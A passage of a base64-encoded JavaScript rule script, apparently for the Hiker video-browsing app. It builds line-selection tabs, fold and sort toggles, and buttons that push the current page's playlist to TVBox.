CAgICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+WIh+aNouaIkOWKn++8gSc7XFxcXG4gICAgICAgICAgICB9LCB2YXJpLCBzaHNvcnQsIGksY3VzdG9tLue6v+i3r+mAieS4rSlcXFxcbiAgICAgICAgICAgIGQucHVzaCh7XFxcXG4gICAgICAgICAgICAgICAgdGl0bGU6ICfigJzigJzigJ3igJ0nICsgKGdldE15VmFyKHZhcmksICcwJykgPT0gaSA/IHRhYnNbaV0uZm9udGNvbG9yKGN1c3RvbS7nur/ot6/pgInkuK0pIDogdGFic1tpXS5mb250Y29sb3IoJyMnKSksXFxcXG4gICAgICAgICAgICAgICAgdXJsOiB1cmwsXFxcXG4gICAgICAgICAgICAgICAgY29sX3R5cGU6ICdzY3JvbGxfYnV0dG9uJyxcXFxcbiAgICAgICAgICAgICAgICBleHRyYToge1xcXFxuICAgICAgICAgICAgICAgICAgICBjbHM6IHNoc29ydCArICdfdGFiJyxcXFxcbiAgICAgICAgICAgICAgICAgICAgaWQ6IHNoc29ydCArICdfdGFiXycgKyBpLFxcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgIH0pXFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgIGNvbF90eXBlOidibGFua19ibG9jaycsIC8vJ2JsYW5rX2Jsb2NrJyxcXFxcbiAgICAgICAgICAgIGV4dHJhOiB7XFxcXG4gICAgICAgICAgICAgICAgaWQ6IHNoc29ydCArICdfbGluZScsXFxcXG4gICAgICAgICAgICB9XFxcXG4gICAgICAgIH0pXFxcXG4gICAgfSxcXFxcbiAgICBwdXNoVGFiOmZ1bmN0aW9uKHZhcmksc2hzb3J0KXtcXFxcbiAgICAgIGFkZExpc3RlbmVyKCdvblJlZnJlc2gnLCAkLnRvU3RyaW5nKChzaHNvcnQpID0+IHtcXFxcbiAgICAgICAgY2xlYXJNeVZhcihzaHNvcnQrJ19wdXNoY2ZnJyk7XFxcXG4gICAgICAgIGNsZWFyTXlWYXIoc2hzb3J0KydfZHVvc2VsZWN0Jyk7XFxcXG4gICAgICAgIH0sIHNoc29ydCkpXFxcXG4gICAgICAgdmFyIHBvYmo9e1xcXFxuICAgICAgICfljZXmjqgnOlsn4qa/5Y2V5o6oJywnPGI+4qa/5Y2V5o6oPC9iPicuZm9udGNvbG9yKCcjMDBGQTlBJyldLFxcXFxuICAgICAgICfpgInmjqgnOlsn4piR6YCJ5o6oJywnPGI+4piR6YCJ5o6oPC9iPicuZm9udGNvbG9yKCcjNDY4MkI0JyldLFxcXFxuICAgICAgfVxcXFxuICAgICAgXFxcXG4gICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgIHRpdGxlOifijJgnLFxcXFxuICAgICAgICAgIGNvbF90eXBlOidzY3JvbGxfYnV0dG9uJyxcXFxcbiAgICAgICAgICB1cmw6J2hpa2VyOi8vZW1wdHknLFxcXFxuICAgICAgICAgIGV4dHJhOntcXFxcbiAgICAgICAgICAgIGNsczpzaHNvcnQrJ19wdXNodGFiJyxcXFxcbiAgICAgICAgICB9XFxcXG4gICAgICAgIH0se1xcXFxuICAgICAgICAgIHRpdGxlOnBvYmpbJ+WNleaOqCddWzBdLFxcXFxuICAgICAgICAgIGNvbF90eXBlOidzY3JvbGxfYnV0dG9uJyxcXFxcbiAgICAgICAgICB1cmw6JCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoc2hzb3J0LHBvYmosdmFyaSk9PntcXFxcbiAgICAgICAgICBpZihnZXRNeVZhcih2YXJpKydmb2xkJywnMScpPT0nMCcpe1xcXFxuICAgICAgICAgICAgcmV0dXJuICd0b2FzdDovL+WxleW8gOaJjeiDveaTjeS9nCc7XFxcXG4gICAgICAgICAgfVxcXFxuICAgICAgICAgICAgXFxcXG4gICAgICAgICAgdmFyIHRpdGxlcz1wb2JqWyfljZXmjqgnXTtcXFxcbiAgICAgICAgICB2YXIgcGNmZz1zdG9yYWdlMC5nZXRNeVZhcihzaHNvcnQrJ19wdXNoY2ZnJywne30nKTtcXFxcbiAgICAgICAgICBwY2ZnWydvYmonXT1wb2JqO1xcXFxuICAgICAgICAgIHZhciDljZXmjqg9cGNmZ1sn5Y2V5o6oJ10/cGNmZ1sn5Y2V5o6oJ106ZmFsc2U7XFxcXG4gICAgICAgICAgXFxcXG4gICAgICAgICAgaWYo5Y2V5o6oKXtcXFxcbiAgICAgICAgICAgIHVwZGF0ZUl0ZW0oc2hzb3J0KydfcHVzaCcse1xcXFxuICAgICAgICAgICAgICB0aXRsZTp0aXRsZXNbMF0sXFxcXG4gICAgICAgICAgICB9KVxcXFxuICAgICAgICAgICAgcGNmZ1sn5Y2V5o6oJ109ZmFsc2U7XFxcXG4gICAgICAgICAgICBwY2ZnWydwbGF5bGlzdCddLm1hcCgoeCk9PntcXFxcbiAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0oeC5leHRyYS5pZCx7XFxcXG4gICAgICAgICAgICAgICAgIHVybDp4LnVybCxcXFxcbiAgICAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICB9KVxcXFxuICAgICAgICAgIH1lbHNle1xcXFxuICAgICAgICAgICAgdXBkYXRlSXRlbShzaHNvcnQrJ19wdXNoJyx7XFxcXG4gICAgICAgICAgICAgIHRpdGxlOifigJzigJzigJ3igJ0nK3RpdGxlc1sxXSxcXFxcbiAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICB1cGRhdGVJdGVtKHNoc29ydCsnX3B1c2hzJyx7XFxcXG4gICAgICAgICAgICAgIHRpdGxlOnBvYmpbJ+mAieaOqCddWzBdLFxcXFxuICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgICAgIHBjZmdbJ+WNleaOqCddPXRydWU7XFxcXG4gICAgICAgICAgICBwY2ZnWyfpgInmjqgnXT1mYWxzZTtcXFxcbiAgICAgICAgICAgIHZhciBwbGF5bGlzdD1maW5kSXRlbXNCeUNscyhzaHNvcnQpO1xcXFxuICAgICAgICAgICAgcGNmZ1sncGxheWxpc3QnXT1wbGF5bGlzdDtcXFxcbiAgICAgICAgICAgIGZpbmRJdGVtc0J5Q2xzKHNoc29ydCkubWFwKHg9PntcXFxcbiAgICAgICAgICAgICAgdmFyIGRwdXNoPXtcXFxcbiAgICAgICAgICAgICAgICBuYW1lOmdldFBhZ2VUaXRsZSgpLFxcXFxuICAgICAgICAgICAgICAgIHVybDp4LnRpdGxlKyckJyt4LmV4dHJhLmlkXFxcXG4gICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgdXBkYXRlSXRlbSh4LmV4dHJhLmlkLHtcXFxcbiAgICAgICAgICAgICAgICB1cmw6JCgnJykubGF6eVJ1bGUoKGRwdXNoKT0+e1xcXFxuICAgICAgICAgICAgICAgICByZXR1cm4gJ2hpa2VyOi8vcGFnZS9wdXNoP3J1bGU9WFlR5o6o6YCBJnB1c2h1cmw9JyArIGVuY29kZVVSSUNvbXBvbmVudChKU09OLnN0cmluZ2lmeShkcHVzaCkpO1xcXFxuICAgICAgICAgICAgICAgIH0sZHB1c2gpXFxcXG4gICAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICB9KVxcXFxuICAgICAgICAgIH1cXFxcbiAgICAgICAgICBzdG9yYWdlMC5wdXRNeVZhcihzaHNvcnQrJ19wdXNoY2ZnJyxwY2ZnKTtcXFxcbiAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8vJyso5Y2V5o6oPyfljZXmjqjlvIDlkK8nOifljZXmjqjlhbPpl60nKTtcXFxcbiAgICAgICAgICB9LHNoc29ydCxwb2JqLHZhcmkpLFxcXFxuICAgICAgICAgIGV4dHJhOntcXFxcbiAgICAgICAgICAgIGlkOnNoc29ydCsnX3B1c2gnLFxcXFxuICAgICAgICAgICAgY2xzOnNoc29ydCsnX3B1c2h0YWInLFxcXFxuICAgICAgICAgIH1cXFxcbiAgICAgICAgfSx7XFxcXG4gICAgICAgICAgdGl0bGU6cG9ialsn6YCJ5o6oJ11bMF0sXFxcXG4gICAgICAgICAgY29sX3R5cGU6J3Njcm9sbF9idXR0b24nLFxcXFxuICAgICAgICAgIHVybDokKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChzaHNvcnQscG9iaix2YXJpKT0+e1xcXFxuICAgICAgICAgIGlmKGdldE15VmFyKHZhcmkrJ2ZvbGQnLCcxJyk9PScwJyl7XFxcXG4gICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5bGV5byA5omN6IO95pON5L2cJztcXFxcbiAgICAgICAgICB9XFxcXG4gICAgICAgICAgdmFyIHRpdGxlcz1wb2JqWyfpgInmjqgnXTtcXFxcbiAgICAgICAgICB2YXIgcGNmZz1zdG9yYWdlMC5nZXRNeVZhcihzaHNvcnQrJ19wdXNoY2ZnJywne30nKTtcXFxcbiAgICAgICAgICBwY2ZnWydvYmonXT1wb2JqO1xcXFxuICAgICAgICAgIHZhciDpgInmjqg9cGNmZ1sn6YCJ5o6oJ10/cGNmZ1sn6YCJ5o6oJ106ZmFsc2U7XFxcXG4gICAgICAgICAgaWYo6YCJ5o6oKXtcXFxcbiAgICAgICAgICAgIHVwZGF0ZUl0ZW0oc2hzb3J0KydfcHVzaHMnLHtcXFxcbiAgICAgICAgICAgICAgdGl0bGU6dGl0bGVzWzBdLFxcXFxuICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgICAgIHBjZmdbJ+mAieaOqCddPWZhbHNlO1xcXFxuICAgICAgICAgICAgcGNmZ1sncGxheWxpc3QnXS5tYXAoKHgpPT57XFxcXG4gICAgICAgICAgICAgICB1cGRhdGVJdGVtKHguZXh0cmEuaWQse1xcXFxuICAgICAgICAgICAgICAgICB0aXRsZTp4LnRpdGxlLFxcXFxuICAgICAgICAgICAgICAgICB1cmw6eC51cmwsXFxcXG4gICAgICAgICAgICAgICB9KVxcXFxuICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgICAgIHVwZGF0ZUl0ZW0oc2hzb3J0KydfcHVzaHRvJywge1xcXFxuICAgICAgICAgICAgICAgICAgICB0aXRsZTogJ+aOqOmAgeacrOmhtT0+VFZCb3gnLFxcXFxuICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICBjbGVhck15VmFyKHNoc29ydCsnX2R1b3NlbGVjdCcpO1xcXFxuICAgICAgICAgICB9ZWxzZXtcXFxcbiAgICAgICAgICAgIHVwZGF0ZUl0ZW0oc2hzb3J0KydfcHVzaHMnLHtcXFxcbiAgICAgICAgICAgICAgdGl0bGU6J+KAnOKAnOKAneKAnScrdGl0bGVzWzFdLFxcXFxuICAgICAgICAgICAgfSlcXFxcbiAgICAgICAgICAgIHBjZmdbJ+mAieaOqCddPXRydWU7XFxcXG4gICAgICAgICAgICBwY2ZnWyfljZXmjqgnXT1mYWxzZTtcXFxcbiAgICAgICAgICAgIHZhciBwbGF5bGlzdD1maW5kSXRlbXNCeUNscyhzaHNvcnQpO1xcXFxuICAgICAgICAgICAgcGNmZ1sncGxheWxpc3QnXT1wbGF5bGlzdDtcXFxcbiAgICAgICAgICAgIGxldCBJZHM9cGxheWxpc3QubWFwKGl0ID0+IGl0LmV4dHJhLmlkKTtcXFxcbiAgICAgICAgICAgICAgICBJZHMuZm9yRWFjaCh4ID0+IHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdmFyIHRpdGxlID0gZmluZEl0ZW0oeCkudGl0bGU7XFxcXG4gICAgICAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0oeCwge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgdXJsOiAkLm1zbSh0aXRsZSwgeCxzaHNvcnQpLFxcXFxuICAgICAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgICAgICB9KTtcXFxcbiAgICAgICAgICAgIHVwZGF0ZUl0ZW0oc2hzb3J0KydfcHVzaCcse1xcXFxuICAgICAgICAgICAgICB0aXRsZTpwb2JqWyfljZXmjqgnXVswXSxcXFxcbiAgICAgICAgICAgIH0pXFxcXG4gICAgICAgICAgICB1cGRhdGVJdGVtKHNoc29ydCsnX3B1c2h0bycsIHtcXFxcbiAgICAgICAgICAgICAgICAgICAgdGl0bGU6ICfmjqjpgIHpgInkuK09PlRWQm94JyxcXFxcbiAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgIH1cXFxcbiAgICAgICAgICBzdG9yYWdlMC5wdXRNeVZhcihzaHNvcnQrJ19wdXNoY2ZnJyxwY2ZnKTtcXFxcbiAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8vJyso6YCJ5o6oPyfpgInmjqjlvIDlkK8nOifpgInmjqjlhbPpl60nKTtcXFxcbiAgICAgICAgICB9LHNoc29ydCxwb2JqLHZhcmkpLFxcXFxuICAgICAgICAgIGV4dHJhOntcXFxcbiAgICAgICAgICAgIGlkOnNoc29ydCsnX3B1c2hzJyxcXFxcbiAgICAgICAgICAgIGNsczpzaHNvcnQrJ19wdXNodGFiJ1xcXFxuICAgICAgICAgIH1cXFxcbiAgICAgICAgfSx7XFxcXG4gICAgICAgICAgdGl0bGU6IFxcXFxcXFwi5o6o6YCB5pys6aG1PT5UVkJveFxcXFxcXFwiLFxcXFxuICAgICAgICAgIGNvbF90eXBlOidzY3JvbGxfYnV0dG9uJyxcXFxcbiAgICAgICAgICB1cmw6JCgnI25vTG9hZGluZyMnKS5sYXp5UnVsZSgoc2hzb3J0LHZhcmkpPT57XFxcXG4gICAgICAgICAgdmFyIHBjZmc9c3RvcmFnZTAuZ2V0TXlWYXIoc2hzb3J0KydfcHVzaGNmZycsJ3t9Jyk7XFxcXG4gICAgICAgICAgdmFyIOWNleaOqD1wY2ZnWyfljZXmjqgnXT9wY2ZnWyfljZXmjqgnXTpmYWxzZTtcXFxcbiAgICAgICAgICB2YXIg6YCJ5o6oPXBjZmdbJ+mAieaOqCddP3BjZmdbJ+mAieaOqCddOmZhbHNlO1xcXFxuICAgICAgICAgIGlmKCHljZXmjqgmJiHpgInmjqgpe1xcXFxuICAgICAgICAgIHZhciB0YWJzPXN0b3JhZ2UwLmdldE15VmFyKHNoc29ydCsnX3RhYnMnLCdbXScpO1xcXFxuICAgICAgICAgIHRyeXtcXFxcbiAgICAgICAgICB2YXIgcGxzPXN0b3JhZ2UwLmdldE15VmFyKHNoc29ydCsnX2xpc3QnLCdbXScpLm1hcChsaSA9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICByZXR1cm4gbGkubWFwKGl0ZW0gPT4gaXRlbS50aXRsZSArICckJyArIGl0ZW0udXJsLnJlcGxhY2UoL0BsYXp5UnVsZVtcXFxcXFxcXHNcXFxcXFxcXFNdKy9nLCcnKSkuam9pbignIycpXFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfSkuam9pbignJCQkJyk7XFxcXG4gICAgICAgICAgfWNhdGNoe1xcXFxuICAgICAgICAgIHZhciBwbHM9c3RvcmFnZTAuZ2V0TXlWYXIoc2hzb3J0K1xcXFxcXFwiX2xpc3RcXFxcXFxcIiwnW10nKS5tYXAoeCA9PiB4LnRpdGxlICsgXFxcXFxcXCIkXFxcXFxcXCIgKyB4LnVybCkuam9pbihcXFxcXFxcIiNcXFxcXFxcIik7XFxcXG4gICAgICAgICAgdmFyIHRhYnM9W3RhYnNbZ2V0TXlWYXIodmFyaSwnMCcpXV07XFxcXG4gICAgICAgICAgfVxcXFxuICAgICAgICAgIC8qbG9nKHBscylcXFxcbiAgICAgICAgICBsb2codGFicykqL1xcXFxuICAgICAgICAgIH1cXFxcbiAgICAgICAgICBpZijpgInmjqgpe1xcXFxuICAgICAgICAgIHZhciBwbHM9c3RvcmFnZTAuZ2V0TXlWYXIoc2hzb3J0K1xcXFxcXFwiX2R1b3NlbGVjdFxcXFxcXFwiLCdbXScpLm1hcCh4ID0+IHgudGl0bGUgKyBcXFxcXFxcIiRcXFxcXFxcIiArIHgudXJsKS5qb2luKFxcXFxcXFwiI1xcXFxcXFwiKTtcXFxcbiAgICAgICAgICBpZihwbHMubGVuZ3RoPT0wKXtcXFxcbiAgICAgICAgICAgIHJldHVybiAndG9hc3Q6Ly/pgInmi6nkuLrnqbonO1xcXFxuICAgICAgICAgIH1cXFxcbiAgICAgICAgICB2YXIgdGFicz1bJ+aSreaUvuWIl+ihqCddO1xcXFxuICAgICAgICAgIH1cXFxcbiAgICAgICAgICBcXFxcbiAgICAgICAgICB2YXIgaW5mbz1zdG9yYWdlMC5nZXRNeVZhcignZXJfaW5mbycsJ3t9Jyk7XFxcXG4gICAgICAgICAgdmFyIGRlc2MgPWluZm9bJ2Rlc2MnXTtcXFxcbiAgICAgICAgICB2YXIg5o6o6YCBID0ge1xcXFxuICAgICAgICAgICAgICAgICBcXFxcXFxcIm5hbWVcXFxcXFxcIjogZ2V0UGFnZVRpdGxlKCksXFxcXG4gICAgICAgICAgICAgICAgIFxcXFxcXFwiY29udGVudFxcXFxcXFwiOiBkZXNjfHwnJyxcXFxcbiAgICAgICAgICAgICAgICAgXFxcXFxcXCJwaWNcXFxcXFxcIjogaW5mb1snaW1nJ10gfHwgJycsXFxcXG4gICAgICAgICAgICAgICAgIFxcXFxcXFwiZnJvbVxcXFxcXFwiOiB0YWJzLmpvaW4oJyQkJCcpLFxcXFxuICAgICAgICAgICAgICAgICBcXFxcXFxcInVybFxcXFxcXFwiOiBwbHMsXFxcXG4gICAgICAgICAgIH1cXFxcbiAgICAgICAgICAvL2xvZyjmjqjpgIEpXFxcXG4gICAgICAgICAgIHJldHVybiBcXFxcXFxcImhpa2VyOi8vcGFnZS9wdXNoP3J1bGU9WFlR5o6o6YCBJnB1c2h1cmw9XFxcXFxcXCIgKyBlbmNvZGVVUklDb21wb25lbnQoSlNPTi5zdHJpbmdpZnko5o6o6YCBKSlcXFxcbiAgICAgICAgICB9LHNoc29ydCx2YXJpKSxcXFxcbiAgICAgICAgICBleHRyYTp7XFxcXG4gICAgICAgICAgICBpZDpzaHNvcnQrJ19wdXNodG8nLFxcXFxuICAgICAgICAgICAgY2xzOnNoc29ydCsnX3B1c2h0YWInXFxcXG4gICAgICAgICAgfVxcXFxuICAgICAgICB9LHtcXFxcbiAgICAgICAgICBjb2xfdHlwZTonYmxhbmtfYmxvY2snLFxcXFxuICAgICAgICAgIGV4dHJhOntcXFxcbiAgICAgICAgICAgIGNsczpzaHNvcnQrJ19wdXNodGFiJyxcXFxcbiAgICAgICAgICB9XFxcXG4gICAgICAgIH0pXFxcXG4gICAgfSxcXFxcbiAgICBzZXRMb25nY2xpY2s6ZnVuY3Rpb24oc2hzb3J0LGN1c3RvbSl7XFxcXG4gICAgICByZXR1cm4gW3t0aXRsZTon5qC35byP8J+OqCcsanM6ICQudG9TdHJpbmcoKHNoc29ydCk9PntcXFxcbiAgICAgICAgICAgICAgICAgICAgbGV0IGFsbF9jb2xzID0gWycnXS5jb25jYXQoZ2V0Q29sVHlwZXMoKSk7XFxcXG4gICAgICAgICAgICAgICAgICAgIGFsbF9jb2xzPWFsbF9jb2xzLmZpbHRlcih4PT5cXFxcbiAgICAgICAgICAgICAgICAgICAgICAvKHRleHRffGZsZXgpLiovLnRlc3QoeCkmJnghPSd0ZXh0X2ljb24nKTtcXFxcbiAgICAgICAgICAgICAgICAgICAgICAvL2xvZyhhbGxfY29scylcXFxcbiAgICAgICAgICAgICAgICAgICAgbGV0IGNscyA9IHN0b3JhZ2UwLmdldE15VmFyKCdlcl9wbGF5bGlzdHMnLCd7fScpXFxcXG4gICAgICAgICAgICAgICAgICAgIHx8ICcnO1xcXFxuICAgICAgICAgICAgICAgICAgICBpZihjbHNbc2hzb3J0XSE9Jycpe1xcXFxuICAgICAgICAgICAgICAgICAgICAgIGNvbD1jbHNbc2hzb3J0XS5jb2xfdHlwZTtcXFxcbiAgICAgICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgICAgICBsZXQg5oyJ6ZKu5qC35byPID0gYWxsX2NvbHMubWFwKChpdCkgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGl0ID09PSBjb2wgPyAn8J+RiScgKyBpdDogaXQ7XFxcXG4gICAgICAgICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgICAgICAgICBsZXQgdGlwcyA9ICfor7fpgInmi6npgInpm4bmjInpkq7moLflvI8nO1xcXFxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gJCjmjInpkq7moLflvI8sIDIsIHRpcHMpLnNlbGVjdCgoc2hzb3J0LGNscykgPT4ge1xcXFxuICAgICAgICAgICAgICAgICAgICAgIGlucHV0ID0gaW5wdXQucmVwbGFjZSgv8J+RiS9nLCAnJyk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAvKnN0b3JhZ2UwLnNldEl0ZW0oJ+aMiemSruagt+W8jycsIGlucHV0KTsqL1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgbGV0IG9sZElkcyA9IChmaW5kSXRlbXNCeUNscyhzaHNvcnQpIHx8IFtdKS5tYXAoaXQ9Pml0LmV4dHJhLmlkKTsgLy/ogIHlhYPntKBpZHNcXFxcbiAgICAgICAgICAgICAgICAgICAgICAgIG9sZElkcy5mb3JFYWNoKHg9PiB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgdXBkYXRlSXRlbSh4LCB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbF90eXBlOiBpbnB1dFxcXFxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xcXFxuICAgICAgICAgICAgICAgICAgICAgICAgfSk7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5bey5YiH5o2i6YCJ6ZuG5oyJ6ZKu5qC35byP5Li6OicgKyBpbnB1dDtcXFxcbiAgICAgICAgICAgICAgICAgICAgfSxzaHNvcnQsY2xzKTtcXFxcbiAgICAgICAgICAgICAgICB9LHNoc29ydCxjdXN0b20pfV1cXFxcbiAgICB9LFxcXFxuICAgIHNldFRhYnM6IGZ1bmN0aW9uKHRhYnMsIHZhcmksIHNoc29ydCxwYXJzZSkge1xcXFxuICAgICAgICBsZXQgY3VzdG9tPXBhcnNlLuiHquWumuS5iTtcXFxcbiAgICAgICAgY3VzdG9tID10aGlzLmdldFByZXNldChjdXN0b20pO1xcXFxuICAgICAgICBzaHNvcnQgPSBzaHNvcnQgPyBzaHNvcnQgOiAnc2hzb3J0JztcXFxcbiAgICAgICAgdmFyIHRpdGxlID0gKGdldE15VmFyKHNoc29ydCArICdfc29ydCcsICcwJykgPT0gJzEnKSA/ICc8Yj48c3BhbiBzdHlsZT1cXFxcXFxcImNvbG9yOiAnK2N1c3RvbS7pgIbluo/popzoibIrJ1xcXFxcXFwiPumAhuW6jzwvc3Bhbj48L2I+JyA6ICc8Yj48c3BhbiBzdHlsZT1cXFxcXFxcImNvbG9yOiAnK2N1c3RvbS7mraPluo/popzoibIrJ1xcXFxcXFwiPuato+W6jzwvc3Bhbj48L2I+J1xcXFxuICAgICAgICBkLnB1c2goe1xcXFxuICAgICAgICAgICAgdGl0bGU6IHZhcmkgKyAnOicgKyB0aXRsZSxcXFxcbiAgICAgICAgICAgIGRlc2M6ICflhbEnICsgU3RyaW5nKHRhYnMubGVuZ3RoKS5mb250Y29sb3IoJyM0NjgyQjQnKSArICfmnaHnur/ot68nLFxcXFxuICAgICAgICAgICAgdXJsOiAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChzaHNvcnQsdmFyaSxjdXN0b20pID0+IHtcXFxcbiAgICAgICAgICAgICAgbGV0IGNvbmYgPSBnZXRNeVZhcihzaHNvcnQgKyAnX3NvcnQnLCAnMCcpO1xcXFxuICAgICAgICAgICAgICBpZihnZXRNeVZhcignZXJfJyt2YXJpKydmb2xkJywnMScpPT0nMCcpe1xcXFxuICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5bGV5byA5omN6IO95pON5L2cJztcXFxcbiAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgICAgIHZhciBjbHNsaXN0cyA9IGZpbmRJdGVtc0J5Q2xzKHNoc29ydCk7XFxcXG4gICAgICAgICAgICAgICAgdmFyIG5ld2Nsc2xpc3QgPSAkLmRhdGFDb252ZXJ0KGNsc2xpc3RzKTtcXFxcbiAgICAgICAgICAgICAgIFxcXFxuICAgICAgICAgICAgICAgdmFyIHRpdGxlcz1bYCR7Y3VzdG9tLuato+W6j+minOiJsn1cXFxcXFxcIj7mraPluo9gLGAke2N1c3RvbS7pgIbluo/popzoibJ9XFxcXFxcXCI+6YCG5bqPYF07XFxcXG4gICAgICAgICAgICAgICBcXFxcbiAgICAgICAgICAgICAgICBkZWxldGVJdGVtQnlDbHMoc2hzb3J0KTtcXFxcbiAgICAgICAgICAgICAgICBuZXdjbHNsaXN0LnJldmVyc2UoKTtcXFxcbiAgICAgICAgICAgICAgICBhZGRJdGVtQWZ0ZXIoc2hzb3J0ICsgJ19saW5lJywgbmV3Y2xzbGlzdCk7XFxcXG5cXFxcbiAgICAgICAgICAgICAgICB2YXIgb2JqID0gZmluZEl0ZW0oc2hzb3J0ICsgJ19hdmF0YXInKVxcXFxuXFxcXG4gICAgICAgICAgICAgICAgaWYgKGNvbmYgPT0gJzEnKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0oc2hzb3J0ICsgJ19hdmF0YXInLCB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogb2JqLnRpdGxlLnJlcGxhY2UodGl0bGVzWzFdLCB0aXRsZXNbMF0pLFxcXFxuICAgICAgICAgICAgICAgICAgICB9KVxcXFxuICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcihzaHNvcnQgKyAnX3NvcnQnLCAnMCcpO1xcXFxuICAgICAgICAgICAgICAgIH0gZWxzZSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHVwZGF0ZUl0ZW0oc2hzb3J0ICsgJ19hdmF0YXInLCB7XFxcXG4gICAgICAgICAgICAgICAgICAgICAgICB0aXRsZTogb2JqLnRpdGxlLnJlcGxhY2UodGl0bGVzWzBdLCB0aXRsZXNbMV0pLFxcXFxuICAgICAgICAgICAgICAgICAgICB9KVxcXFxuICAgICAgICAgICAgICAgICAgICBwdXRNeVZhcihzaHNvcnQgKyAnX3NvcnQnLCAnMScpO1xcXFxuICAgICAgICAgICAgICAgIH1cXFxcbiAgICAgICAgICAgICAgICByZXR1cm4gJ3RvYXN0Oi8v5YiH5o2i5o6S5bqP5oiQ5YqfJztcXFxcbiAgICAgICAgICAgIH0sIHNoc29ydCx2YXJpLGN1c3RvbSksXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ2F2YXRhcicsXFxcXG4gICAgICAgICAgICBpbWc6IGN1c3RvbS7lm77moIcgLFxcXFxuICAgICAgICAgICAgZXh0cmE6e1xcXFxuICAgICAgICAgICAgICBpZDpzaHNvcnQrJ19hdmF0YXInLFxcXFxuICAgICAgICAgICAgICBsb25nQ2xpY2s6dGhpcy5zZXRMb25nY2xpY2soc2hzb3J0KSxcXFxcbiAgICAgICAgICAgIH1cXFxcbiAgICAgICAgfSlcXFxcbiAgICAgICAgdmFyIOaKmOWPoCA9ICfigJzigJzigJ3igJ08Yj4nICsgJ+KYtycuZm9udGNvbG9yKFxcXFxcXFwiI0QzRDNEM1xcXFxcXFwiKTtcXFxcbiAgICAgICAgdmFyIOWxleW8gCA9ICfigJzigJzigJ3igJ08Yj4nICsgJ+KYsCcuZm9udGNvbG9yKFxcXFxcXFwiI0ZGQTUwMFxcXFxcXFwiKTtcXFxcbiAgICAgICAgdmFyIGZvbGRuYW1lID0gJ2VyXycrdmFyaSArICdmb2xkJztcXFxcbiAgICAgICAgdmFyICBmb2xkID0gZ2V0TXlWYXIoZm9sZG5hbWUsICcxJyk7XFxcXG4gICAgICAgIGlmKHR5cGVvZihwYXJzZVsn5o6o6YCBJ10pIT0ndW5kZWZpbmVkJyYmcGFyc2VbJ+aOqOmAgSddKVxcXFxuICAgICAgICB0aGlzLnB1c2hUYWIoJ2VyXycrdmFyaSxzaHNvcnQpO1xcXFxuICAgICAgICBcXFxcbiAgICAgICAgZC5wdXNoKHtcXFxcbiAgICAgICAgICAgIHRpdGxlOiBmb2xkID09PSAnMCcgPyDmipjlj6AgOiDlsZXlvIAsXFxcXG4gICAgICAgICAgICBjb2xfdHlwZTogJ3Njcm9sbF9idXR0b24nLFxcXFxuICAgICAgICAgICAgdXJsOiAkKCcjbm9Mb2FkaW5nIycpLmxhenlSdWxlKChmb2xkbmFtZSxzaHNvcnQpID0+IHtcXFxcbiAgICAgICAgICAgICAgICB2YXIgIGZvbGQgPSBnZXRNeVZhcihmb2xkbmFtZSwgJzEnKTtcXFxcbiAgICAgICAgICAgICAgICB2YXIgb2JqID0gZmluZEl0ZW0oc2hzb3J0KydfbGluZScpO1xcXFxuICAgICAgICAgICAgICAgIHZhciBidG49ZmluZEl0ZW0oc2hzb3J0KydfYnV0dG9uJyk7XFxcXG4gICAgICAgICAgICAgICAgdmFyIGZvbGRzPVsnPGZvbnQgY29sb3I9XFxcXFxcXCIjRDNEM0QzXFxcXFxcXCI+4pi3JywnPGZvbnQgY29sb3I9XFxcXFxcXCIjRkZBNTAwXFxcXFxcXCI+4piwJ107XFxcXG4gICAgICAgICAgICAgICAgXFxcXG4gICAgICAgICAgICAgICAgaWYoZm9sZD09JzAnKXtcXFxcbiAgICAgICAgICAgI